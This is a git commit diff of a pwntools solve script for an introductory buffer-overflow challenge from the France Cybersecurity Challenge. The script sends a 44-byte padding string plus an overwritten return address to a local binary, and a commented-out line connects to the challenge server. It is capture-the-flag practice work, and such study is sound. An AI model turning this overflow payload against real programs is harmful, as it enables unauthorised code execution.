2698b15a1cfbf7e712541d6bbfd19377f58f9e08
Cyriaque <cyriaque.couenon@gmail.com>
2022-06-21 04:13:49 +0200

    gog

--- intro/Depassement_de_tampon/solve.py
+++ intro/Depassement_de_tampon/solve.py
@@ -1,16 +1,16 @@
 from pwn import *
+#cyclic, p32, process, raw_input
 
-#io = remote("challenges.france-cybersecurity-challenge.fr", 2050)
+# io = remote("challenges.france-cybersecurity-challenge.fr", 2050)
 
-pl = cyclic(54)
-#pl += p32(0x004011a2)
-#pl += p32(0x0040205c)
-pl += p32(0x00402108)
+#pl = cyclic(36)
+# pl += p32(0x004011a2)
+# pl += p32(0x0040205c)
+RIP = p64(0x00402108)
+OFFSET = "A" * 44
+
 
 io = process("./pwn")
-raw_input("attach GDB")
-io.sendline(pl)
-io.wait()
-io.readuntil("foo")
-
+#raw_input("attach GDB")
+io.sendline(OFFSET.encode() + RIP)
 print(io.readlineS(False))
